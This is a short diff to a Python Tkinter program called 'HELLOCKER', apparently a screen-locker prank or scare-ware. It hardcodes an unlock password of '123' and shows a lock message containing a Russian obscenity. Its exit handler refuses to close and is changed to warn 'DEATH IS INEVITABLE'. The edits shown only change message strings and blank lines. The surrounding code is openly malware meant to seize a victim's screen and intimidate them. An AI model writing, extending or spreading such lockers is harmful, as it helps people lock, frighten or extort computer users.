@@ -15,9 +15,6 @@ import os
 import keyboard
 import sys
 
-
-
-
 password = "123"
 lock_text = "windows blocked.tobi pizda"
 count = 3
@@ -40,7 +37,7 @@ def tapp(key):
 def check():
 	global count
 	if enter_pass.get() == password:
-		messagebox.showinfo("HELLOCKER","unlocked sucseccfully")
+		messagebox.showinfo("HELLOCKER","UNLOCKED SUCCESSFULLY")
 
 		uninstall(wind)
 	else:
@@ -54,7 +51,7 @@ def check():
 
 
 def exiting():
-	messagebox.showwarning("HELLOCKER","YOU CAN NOT EXIT")
+	messagebox.showwarning("HELLOCKER","DEATH IS INEVITABLE")
 wind = Tk()
 wind.title("HELLOCKER")
 wind["bg"] = "black"
